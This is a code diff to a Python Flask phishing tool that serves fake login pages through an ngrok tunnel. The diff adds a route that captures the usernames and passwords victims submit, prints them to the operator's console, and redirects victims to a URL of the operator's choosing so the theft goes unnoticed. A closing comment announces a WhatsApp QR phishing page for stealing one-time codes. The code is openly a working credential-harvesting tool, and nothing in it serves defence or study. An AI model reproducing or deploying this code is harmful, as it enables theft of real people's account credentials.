@@ -38,7 +38,7 @@ for module in modules:
         exit(1)
 
 
-from flask import Flask, render_template, abort
+from flask import Flask, render_template, abort, redirect, request
 from pyngrok import ngrok
 import termcolor, random, pyfiglet
 from requests import head
@@ -73,7 +73,15 @@ ascii_art = pyfiglet.figlet_format(text)
 color = ["green", "yellow", "white", "cyan", "blue", "light_red", "magenta"]
 print(termcolor.colored(ascii_art, random.choice(color)))
 
-por = int(input(termcolor.colored("Enter port number here: ", "cyan")))
+try:
+    por = int(input(termcolor.colored("Enter port number here (Default port - 8096): ", "cyan")))
+
+    if por == "":
+        por = 8096
+
+except:
+    por = 8096
+
 chhosse = input(termcolor.colored("Enter: ", "green")).lower()
 
 optiosn = {
@@ -94,10 +102,26 @@ else:
     print(termcolor.colored("Invalid input! Please choose a valid phishing page type.", "red"))
     exit()
 
+custom_url = input(f"{purple}Enter Custom Url: ")
+
+
 @app.route("/")
 def hello_world():
     
     return render_template(f"{optiosn[chhosse]}")
+
+
+@app.route("/getdetails", methods=["POST"])
+def getdetails():
+    
+    if request.method == "POST":
+        user = request.form.get("username")
+        passw = request.form.get("password")
+
+        print(f"\n\n{byellow}[+] User: {user}\n[+] Password: {passw}")
+
+        return redirect(custom_url)
+
 
 if __name__ == "__main__":
     sss = input(termcolor.colored("\n\nAre you want we start ngrok or you start itself Y for yes N for no!: ", "red"))
@@ -120,3 +144,6 @@ if __name__ == "__main__":
         print(termcolor.colored(f"\n* Running on http://127.0.0.1:{por} \n", "light_green"))
 
     app.run(port=por)
+
+
+# Note - Whatsapp qr phishing page and getting otp (Comming Soon!)
